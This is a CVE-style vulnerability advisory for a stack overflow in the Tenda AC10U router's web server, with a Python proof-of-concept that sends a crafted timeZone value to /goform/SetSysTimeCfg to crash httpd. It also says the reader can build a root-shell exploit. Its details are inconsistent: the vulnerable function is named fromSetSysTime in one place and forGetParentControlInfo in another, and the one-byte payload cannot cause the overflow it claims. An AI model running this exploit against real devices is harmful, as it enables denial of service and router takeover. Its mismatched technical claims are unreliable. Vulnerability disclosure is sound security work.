# CVE-2023-44017

> vendor: Tenda
>
> product: AC10U v1.0
>
> version: US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01
>
> type: Stack Overflow  

## Vulnerability Description

Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 were discovered to contain a stack overflow via the timeZone parameter in the fromSetSysTime function.

## Vulnerability Details

![2](https://github.com/aixiao0621/Tenda/blob/main/AC10U/6/2.png)

![1](https://github.com/aixiao0621/Tenda/blob/main/AC10U/6/1.png)

In function forGetParentControlInfo function line 87, it reads in a user-provided parameter, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

## Recurring vulnerabilities and POC

```python
import requests

host = "192.168.59.136"
cyclic = b"\r"

def exploit_fromSetSysTime():
    url = f"http://{host}/goform/SetSysTimeCfg"
    data = {
        b'timeType':b'sync',
        b'timeZone':cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

exploit_fromSetSysTime()
```

Run poc and you will see process httpd crash, segmentation fault. And you can write your own exp to get the root shell.
